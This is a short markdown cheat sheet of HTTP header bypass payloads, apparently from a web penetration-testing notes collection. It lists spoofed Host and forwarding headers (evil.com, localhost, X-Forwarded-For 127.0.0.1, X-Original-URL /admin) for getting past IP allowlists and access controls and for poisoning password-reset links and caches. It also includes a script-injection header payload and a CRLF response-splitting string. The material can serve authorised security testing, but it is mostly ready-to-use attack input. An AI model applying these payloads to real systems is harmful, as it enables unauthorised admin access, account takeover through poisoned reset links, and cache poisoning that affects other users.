# Host and Header Bypass

Headers are trusted far more than they should be. Every proxy hop adds one, and the app
usually believes the last one it reads.

---

## Host header

```
Host: localhost
Host: 127.0.0.1
Host: 127.0.0.1:80
Host: [::1]
Host: internal.example.com
Host: example.com.evil.com
Host: evil.com
Host: example.com:443@evil.com
Host: example.com%00.evil.com
Host: example.com.
```

Use cases: vhost routing to an internal app, password-reset link poisoning, cache key
poisoning, absolute-URL generation, SSRF allowlist bypass.

---

## Forwarding headers

```
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-Proto: https
X-Forwarded-Port: 443
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Original-Host: internal
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
Forwarded: for=127.0.0.1;host=evil.com;proto=https
```

Multiple values and duplicates matter:

```
X-Forwarded-Host: a.com, b.com
X-Forwarded-Host: a.com
X-Forwarded-Host: b.com
```

The app may take the first, the last, or join them. Test each.

---

## Trust-boundary checks

- Does `X-Forwarded-For: 127.0.0.1` reach an admin panel? (IP allowlist)
- Does `X-Forwarded-Proto: https` skip a redirect?
- Does `X-Forwarded-Host: localhost` change the reset link?
- Does `X-Original-URL` route past the ACL?
- Does `X-Forwarded-Prefix` change generated links?

---

## Header injection

If a header value is reflected unsanitized:

```
X-Forwarded-Host: evil.com"><script>alert(1)</script>
Referer: https://evil.com/%0d%0aSet-Cookie: a=b
```

CRLF in a header value → response splitting (rare but real on old stacks).

---

## Cache interaction

Header-based bypass + cache = poisoning. If `X-Forwarded-Host` changes the body and the
response is cacheable, one request poisons everyone. See `02-web/cache-poisoning.md`.

---

## Go deeper

1. Test each header with an out-of-band value (your domain) and watch DNS.
2. Test header *duplication* and comma-joining separately.
3. Test the header on the API host and the static host — different trust.
4. Test whether the header affects the `Location:` of a redirect, not just the body.

---

## Related

- `02-web/401-to-200.md`
- `11-regex/20-bypass.md`
- `00-core/impact-proof.md`
